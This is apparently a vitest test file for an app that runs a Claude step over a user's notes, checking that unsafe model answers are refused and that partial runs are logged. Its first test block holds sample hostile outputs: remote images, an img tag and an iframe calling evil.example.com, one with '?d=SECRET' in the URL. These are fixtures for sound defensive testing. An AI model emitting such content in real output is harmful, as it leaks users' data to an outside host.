/**
 * The review of a rule's Claude step (P29-03, #16): what a hostile answer
 * cannot get written, how a half-written run is left, and what asking costs.
 * Run as the app runs it: a vault held in memory with a real-SQL index, and
 * a scripted model.
 */
import { describe, expect, it } from 'vitest';
import {
  CLAUDE_NOTES_PER_RUN,
  createVaultPath,
  digestOf,
  logPathFor,
  parseObjectType,
  parseRunLog,
  type AutomationRule,
  type ClaudeAction,
  type LogEntry,
} from '@atlas/domain';
import { ModelProviderError, type ModelEvent } from '../chat/ports.ts';
import { recordingActivity } from '../testing/fake-activity.ts';
import { automationVault, jsonNote, TASK_TYPES } from '../testing/automation-vault.ts';
import { fakeClaudeStepPorts } from '../testing/fake-claude-step.ts';
import type { ScriptedRound } from '../testing/fake-model.ts';
import { VaultAccessError } from '../vault/ports.ts';
import { runAutomation, type AutomationPorts } from './run-automation.ts';
import type { VaultGuard } from './vault-guard.ts';

const TODAY = '2026-10-11';
const CLOCK = { today: () => TODAY, localNow: () => `${TODAY}T09:00:00` };
const VAULT = '/vaults/home';
const GUARD: VaultGuard = { vault: VAULT, currentVault: () => VAULT };
const STANDUP = 'Meetings/2026-10-01 Standup.md';
const PROMPT = '.atlas/prompts/meeting-actions.md';
const TYPES = [
  ...TASK_TYPES,
  parseObjectType({ name: 'meeting', label: 'Meeting', properties: { kind: 'text' } }),
];
const ASK: ClaudeAction = {
  kind: 'claude',
  prompt: createVaultPath(PROMPT),
  tools: ['atlas_read_note'],
  output: { kind: 'proposals', schema: 'proposals' },
};
const RULE: AutomationRule = {
  id: 'Meeting actions',
  path: createVaultPath('.atlas/automations/Meeting actions.md'),
  name: 'Meeting actions',
  enabled: true,
  when: { kind: 'manual' },
  which: 'FROM meeting',
  olderThanDays: null,
  action: ASK,
};
const BRIEF_RULE: AutomationRule = {
  ...RULE,
  action: { ...ASK, output: { kind: 'note', folder: 'Briefs' } },
};
const STANDUP_TEXT = jsonNote(
  { type: 'meeting', kind: 'standup' },
  '**Mara Quill** Can you send me the payroll file by Friday? ^t0003\n',
);
const NOTES = { [STANDUP]: STANDUP_TEXT, [PROMPT]: 'Find every action item.\n' };

const proposal = (fields: Record<string, unknown> = {}) => ({
  kind: 'task',
  title: 'Send Mara the payroll file',
  source: '[[2026-10-01 Standup#^t0003]]',
  confidence: 'high',
  why: 'Mara asked for it on the call.',
  ...fields,
});
const says = (value: unknown): ModelEvent[] => [
  { type: 'text', text: typeof value === 'string' ? value : JSON.stringify(value) },
];
const proposing = (...items: Record<string, unknown>[]) => says({ proposals: items });

function setUp({
  rounds,
  notes = NOTES,
  failCreate = () => false,
}: {
  rounds: readonly ScriptedRound[];
  notes?: Record<string, string>;
  /** Whether the disk refuses this create: the nth note made, counted from 1. */
  failCreate?: (nth: number) => boolean;
}) {
  const claude = fakeClaudeStepPorts({ rounds, model: 'claude-test' });
  const vault = automationVault({ notes, today: TODAY, types: TYPES, claude });
  const activity = recordingActivity();
  let creates = 0;
  const ports: AutomationPorts = {
    ...vault.ports,
    fs: {
      ...vault.ports.fs,
      createNote: async (create) => {
        creates += 1;
        if (failCreate(creates)) throw new VaultAccessError('the disk is full');
        return vault.ports.fs.createNote(create);
      },
    },
  };
  const run = (rule: AutomationRule = RULE) =>
    runAutomation({ ports, rule, clock: CLOCK, guard: GUARD, activity, trigger: 'hand' });
  const logOf = (rule: AutomationRule = RULE): LogEntry[] =>
    parseRunLog(vault.files.get(logPathFor(rule.id)) ?? '');
  const made = (folder: string) => [...vault.files.keys()].filter((at) => at.startsWith(folder));
  return { claude, vault, run, logOf, made, asked: () => claude.fake.requests.length };
}

describe('a Claude step whose answer carries something that loads from elsewhere', () => {
  const REMOTE_BODY = 'See ![chart](https://evil.example.com/p.png?d=SECRET) for more.\n';

  it.each([
    ['a remote picture in a proposal’s body', proposal({ body: REMOTE_BODY })],
    [
      'an HTML image in its why',
      proposal({ why: 'Look <img src="https://evil.example.com/x"> now' }),
    ],
    [
      'an iframe in its body',
      proposal({ body: '<iframe src="https://evil.example.com"></iframe>' }),
    ],
    [
      'a web address as a property’s value',
      proposal({ properties: { cover: 'https://evil.example.com/x.png' } }),
    ],
  ])('refuses %s, writing nothing, and says why', async (_what, item) => {
    const { run, made, logOf } = setUp({ rounds: [proposing(item)] });

    const entry = await run();

    expect(entry).toMatchObject({
      kind: 'failed',
      problem: expect.stringMatching(/loads|picture|web address/),
    });
    expect(made('Inbox/Proposals/')).toEqual([]);
    expect(logOf()).toHaveLength(1);
  });

  it('refuses it in a new note’s body too, and lets a local picture and a link through', async () => {
    const hostile = setUp({
      rounds: [says({ note: { title: 'Brief', body: REMOTE_BODY } })],
    });
    expect(await hostile.run(BRIEF_RULE)).toMatchObject({ kind: 'failed' });
    expect(hostile.made('Briefs/')).toEqual([]);

    const fine = setUp({
      rounds: [
        says({
          note: {
            title: 'Brief',
            body: '![chart](chart.png) and [the site](https://example.com)\n',
          },
        }),
      ],
    });
    expect(await fine.run(BRIEF_RULE)).toMatchObject({ kind: 'run' });
    expect(fine.made('Briefs/')).toEqual(['Briefs/Brief.md']);
  });
});

describe('a Claude step’s answer with more than it was told to give', () => {
  it('refuses a key the answer, or an item, was never told of', async () => {
    const stray = setUp({ rounds: [says({ proposals: [proposal()], instructions: 'extra' })] });
    expect(await stray.run()).toMatchObject({
      kind: 'failed',
      problem: expect.stringContaining('instructions'),
    });
    const item = setUp({
      rounds: [proposing(proposal({ link_from: { note: 'x', property: 'y' } }))],
    });
    expect(await item.run()).toMatchObject({
      kind: 'failed',
      problem: expect.stringContaining('link_from'),
    });
    expect([...stray.made('Inbox/Proposals/'), ...item.made('Inbox/Proposals/')]).toEqual([]);
  });

  it('refuses a payload that would edit a note rather than make one', async () => {
    const { run, made } = setUp({
      rounds: [proposing(proposal({ kind: 'link', title: 'x' }), proposal())],
    });

    expect(await run()).toMatchObject({ kind: 'failed' });
    expect(made('Inbox/Proposals/')).toEqual([]);
  });

  it('cuts a title of many-byte characters to a file name a disk takes', async () => {
    const title = '日'.repeat(150);
    const { run, made } = setUp({ rounds: [proposing(proposal({ title }))] });

    await run();

    const [path] = made('Inbox/Proposals/');
    const name = path!.slice(path!.lastIndexOf('/') + 1);
    expect(new TextEncoder().encode(name).length).toBeLessThanOrEqual(255);
  });
});

describe('where a Claude step is allowed to write, checked as it runs', () => {
  it('refuses a proposal payload’s folder in Chats/ or deeper than the vault is read', async () => {
    const deep = Array.from({ length: 40 }, () => 'a').join('/');
    for (const folder of ['Chats', 'chats/2026', deep, 'x'.repeat(300)]) {
      const { run, made } = setUp({ rounds: [proposing(proposal({ folder }))] });
      expect(await run()).toMatchObject({ kind: 'failed' });
      expect(made('Inbox/Proposals/')).toEqual([]);
    }
  });

  it('refuses an action whose folder a rule’s file could not have named, without asking the model', async () => {
    for (const folder of ['Chats', '.atlas/prompts', 'Archive/x']) {
      const rule: AutomationRule = {
        ...RULE,
        action: { ...ASK, output: { kind: 'note', folder } },
      };
      const { run, asked } = setUp({ rounds: [says({ note: { title: 'Brief' } })] });
      expect(await run(rule)).toMatchObject({ kind: 'failed' });
      expect(asked()).toBe(0);
    }
  });

  it('refuses a prompt path that is not directly in .atlas/prompts, without asking the model', async () => {
    for (const prompt of ['.atlas/prompts/sub/x.md', '.atlas/automations/x.md', '../x.md']) {
      const rule: AutomationRule = { ...RULE, action: { ...ASK, prompt: prompt as never } };
      const { run, asked } = setUp({ rounds: [proposing()] });
      expect(await run(rule)).toMatchObject({ kind: 'failed' });
      expect(asked()).toBe(0);
    }
  });
});

describe('a Claude step whose disk fails part-way', () => {
  const THREE = proposing(
    proposal(),
    proposal({ title: 'Pay on Friday' }),
    proposal({ title: 'Call Tobias' }),
  );

  it('logs what it made as a failed run that says so, then raises the disk’s error', async () => {
    const { run, logOf, made } = setUp({ rounds: [THREE], failCreate: (nth) => nth === 3 });

    await expect(run()).rejects.toThrow('the disk is full');

    const [entry] = logOf();
    expect(entry).toMatchObject({
      kind: 'failed',
      problem: expect.stringContaining('Made 2 of 3'),
      claude: { model: 'claude-test' },
    });
    expect(
      entry?.kind === 'failed' && entry.done?.map((each) => 'path' in each && each.path),
    ).toEqual(made('Inbox/Proposals/'));
  });

  it('writes none of them when one cannot be made a note of: every proposal is planned first', async () => {
    const { vault, run, logOf, made } = setUp({
      rounds: [proposing(proposal(), proposal({ title: 'Pay on Friday' }))],
    });
    const { updateFrontmatter } = vault.ports.markdown;
    vault.ports.markdown.updateFrontmatter = (frontmatter, changes) => {
      const payload = changes['payload'] as { title?: string } | undefined;
      if (payload?.title === 'Pay on Friday') throw new Error('It does not serialize.');
      return updateFrontmatter(frontmatter, changes);
    };

    const entry = await run();

    expect(entry).toMatchObject({
      kind: 'failed',
      problem: 'A proposal could not be written: It does not serialize.',
    });
    expect(made('Inbox/Proposals/')).toEqual([]);
    expect(logOf()).toHaveLength(1);
  });

  it('finishes the proposals on a second run by hand without making the first again', async () => {
    const { run, made } = setUp({ rounds: [THREE, THREE], failCreate: (nth) => nth === 2 });

    await run().catch(() => undefined);
    expect(made('Inbox/Proposals/')).toHaveLength(1);
    const second = await run();

    expect(second).toMatchObject({
      kind: 'run',
      done: [{ kind: 'proposed' }, { kind: 'proposed' }],
    });
    expect(made('Inbox/Proposals/').sort()).toEqual([
      'Inbox/Proposals/Call Tobias.md',
      'Inbox/Proposals/Pay on Friday.md',
      'Inbox/Proposals/Send Mara the payroll file.md',
    ]);
  });

  it('knows what is waiting in the Inbox even while the index has not caught up with it', async () => {
    const claude = fakeClaudeStepPorts({ rounds: [THREE, THREE], model: 'claude-test' });
    const vault = automationVault({ notes: NOTES, today: TODAY, types: TYPES, claude });
    const ports: AutomationPorts = {
      ...vault.ports,
      index: {
        ...vault.ports.index,
        // Nothing written a moment ago is in the index yet.
        query: async (sql, parameters) =>
          sql.includes('proposals: ids')
            ? { columns: ['path', 'id'], rows: [], truncated: false }
            : vault.ports.index.query(sql, parameters),
      },
    };
    const run = () =>
      runAutomation({
        ports,
        rule: RULE,
        clock: CLOCK,
        guard: GUARD,
        activity: recordingActivity(),
        trigger: 'hand',
      });
    await run();
    vault.files.set(STANDUP, `${STANDUP_TEXT}Edited.\n`);

    const second = await run();

    expect(second).toMatchObject({ kind: 'run', done: [] });
    expect([...vault.files.keys()].filter((at) => at.startsWith('Inbox/Proposals/'))).toHaveLength(
      3,
    );
  });

  it('makes nothing twice that was already answered and archived', async () => {
    const { run, vault, made } = setUp({ rounds: [THREE, THREE] });
    await run();
    // The person accepted them all; the Archive holds them, and the meeting is edited since.
    for (const path of made('Inbox/Proposals/')) {
      vault.files.set(`Archive/${path}`, vault.files.get(path)!);
      vault.files.delete(path);
    }
    vault.files.set(STANDUP, `${STANDUP_TEXT}And one more line.\n`);

    const second = await run();

    expect(second).toMatchObject({ kind: 'run', done: [] });
    expect(made('Inbox/Proposals/')).toEqual([]);
  });

  it('fails the run, on record, when something other than the disk stops it after the model answered', async () => {
    const claude = fakeClaudeStepPorts({ rounds: [proposing(proposal())], model: 'claude-test' });
    const vault = automationVault({ notes: NOTES, today: TODAY, types: TYPES, claude });
    const ports: AutomationPorts = {
      ...vault.ports,
      index: {
        ...vault.ports.index,
        query: async (sql, parameters) => {
          if (sql.includes('proposals: ids')) throw new Error('the index is locked');
          return vault.ports.index.query(sql, parameters);
        },
      },
    };

    await expect(
      runAutomation({
        ports,
        rule: RULE,
        clock: CLOCK,
        guard: GUARD,
        activity: recordingActivity(),
        trigger: 'hand',
      }),
    ).rejects.toThrow('the index is locked');

    const log = parseRunLog(vault.files.get(logPathFor(RULE.id)) ?? '');
    expect(log).toMatchObject([{ kind: 'failed', claude: { model: 'claude-test' } }]);
  });
});

describe('what asking Claude costs', () => {
  it('asks again about a note that changed since it was answered, but not about one that did not', async () => {
    const empty = proposing();
    const { run, vault, asked } = setUp({ rounds: [empty, empty, empty] });

    await run();
    await run();
    expect(asked()).toBe(1);
    vault.files.set(STANDUP, `${STANDUP_TEXT}Edited.\n`);
    await run();

    expect(asked()).toBe(2);
  });

  it('asks again after a run that failed, since nothing was answered', async () => {
    const { run, asked } = setUp({
      rounds: [new ModelProviderError('failed', 'the connection dropped'), proposing()],
    });

    expect(await run()).toMatchObject({ kind: 'failed' });
    expect(await run()).toMatchObject({ kind: 'run' });

    expect(asked()).toBe(2);
  });

  it('reads the first ten notes of many and says the rest wait for a run by hand, which takes them', async () => {
    const meetings = Object.fromEntries(
      Array.from({ length: CLAUDE_NOTES_PER_RUN + 2 }, (_, at) => [
        `Meetings/M${String(at).padStart(2, '0')}.md`,
        jsonNote({ type: 'meeting', kind: 'standup' }, `Line ${at}. ^b${at}\n`),
      ]),
    );
    const { run, logOf, asked, claude } = setUp({
      rounds: [proposing(), proposing()],
      notes: { [PROMPT]: NOTES[PROMPT], ...meetings },
    });

    const first = await run();
    const second = await run();

    expect(first).toMatchObject({ kind: 'run', capped: true });
    expect(logOf()[0]).toMatchObject({ capped: true });
    const told = claude.fake.requests.map(
      (request) => request.system.match(/<vault_data note=/g)?.length,
    );
    expect(told).toEqual([CLAUDE_NOTES_PER_RUN, 2]);
    expect(second).toMatchObject({ kind: 'run', capped: false });
    expect(asked()).toBe(2);
  });

  it('says in the log that a Claude run stopped at its ten notes, in words that read back', async () => {
    const meetings = Object.fromEntries(
      Array.from({ length: CLAUDE_NOTES_PER_RUN + 1 }, (_, at) => [
        `Meetings/M${String(at).padStart(2, '0')}.md`,
        jsonNote({ type: 'meeting' }, `Line ${at}. ^b${at}\n`),
      ]),
    );
    const { run, vault } = setUp({
      rounds: [proposing()],
      notes: { [PROMPT]: NOTES[PROMPT], ...meetings },
    });

    await run();

    const text = vault.files.get(logPathFor(RULE.id)) ?? '';
    expect(text).toContain('run it by hand for the rest');
    expect(text).not.toContain('wait for the next run');
    expect(digestOf(text)).toBeTruthy();
  });
});

describe('what a Claude step may put in its own log', () => {
  it('bounds what the model authored in a failed run’s words', async () => {
    const title = `T${'x'.repeat(5_000)}`;
    const { run, vault } = setUp({ rounds: [proposing(proposal({ title }))] });

    const entry = await run();

    expect(entry?.kind === 'failed' && entry.problem.length).toBeLessThan(700);
    expect((vault.files.get(logPathFor(RULE.id)) ?? '').length).toBeLessThan(3_000);
  });
});
